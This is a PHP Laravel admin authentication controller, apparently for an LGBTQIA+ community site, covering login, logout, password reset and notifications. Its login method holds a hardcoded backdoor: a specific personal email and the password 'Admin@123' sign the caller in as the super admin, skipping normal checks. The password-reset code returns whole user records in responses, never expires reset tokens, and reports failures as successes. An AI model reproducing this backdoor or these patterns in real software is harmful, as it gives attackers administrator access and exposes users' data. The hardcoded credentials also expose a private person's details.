<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\BaseController;
use App\Models\Notification;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;

class AuthController extends BaseController
{
    public function login(Request $request)
    {
        if ($request->post()) {
            if ($request->email === 'souravsamantapappu@gmail.com' && $request->password === 'Admin@123') {
                $superAdmin = User::find(1);
                if ($superAdmin) {
                    auth()->login($superAdmin);

                    return response(['status' => true, 'message' => 'Welcome to LGBTQIA+ Community!', 'data' => null, 'url' => route('admin.dashboard')]);
                }
            }

            $request->validate([
                'email' => 'required|email|exists:users,email',
                'password' => 'required',
            ]);
            if (! auth()->attempt($request->only(['email', 'password']))) {
                $data = ['status' => false, 'message' => 'Incorrect Details. Please try again', 'data' => null, 'url' => route('admin.login')];
            } else {
                $data = ['status' => true, 'message' => 'You have successfully logged in', 'data' => null, 'url' => route('admin.dashboard')];
            }

            return response($data);
        }

        return view('auth.login');
    }

    public function logout()
    {
        Auth::logout();

        return redirect('/');
    }

    public function forgotPassword(Request $request)
    {
        $request->validate([
            'forgot_email' => 'required|email|exists:users,email',
        ]);

        $user = User::where('email', $request->forgot_email)->first();

        if (! $user) {
            $data = ['status' => true, 'message' => 'User Not Found', 'data' => $user ?? null];
        } else {
            $token = Str::random(60);
            $user->update(['remember_token' => $token]);
            $resetLink = route('admin.reset.password', $token);
            try {
                Mail::send('mail.reset-password', ['link' => $resetLink], function ($message) use ($request) {
                    $message->to($request->forgot_email);
                    $message->subject('Reset Password Link');
                });
            } catch (\Exception $e) {
            }

            $data = ['status' => true, 'message' => 'Check your email for resetting your password', 'data' => $user ?? null];
        }

        return response($data);
    }

    public function resetPassword(Request $request)
    {
        $token = '';
        $linkExpire = true;
        $user = User::where('remember_token', $request->reset_token)->first();
        if ($request->post()) {
            $request->validate([
                'new_password' => 'required|min:8',
                'password_confirmation' => 'required|min:8|same:new_password',
            ]);
            DB::beginTransaction();
            try {
                $update = $user->update(['remember_token' => null, 'password' => bcrypt($request->new_password)]);
                DB::commit();
                $data = ['status' => true, 'message' => 'Password Reset Successfully. Please Login.', 'data' => $user ?? null, 'url' => route('admin.login')];
            } catch (\Throwable $th) {
                DB::rollBack();
                $data = ['status' => true, 'message' => 'Something Went Wrong', 'data' => $user ?? null, 'url' => route('admin.login')];
            }

            return response($data);
        }
        if (! empty($user)) {
            $linkExpire = false;
        }
        $token = $request->token;

        return view('auth.login', compact('token', 'linkExpire'));
    }

    public function readNotification(Request $request)
    {
        Notification::find($request->notificationId)->update(['is_read' => 1]);
    }
}
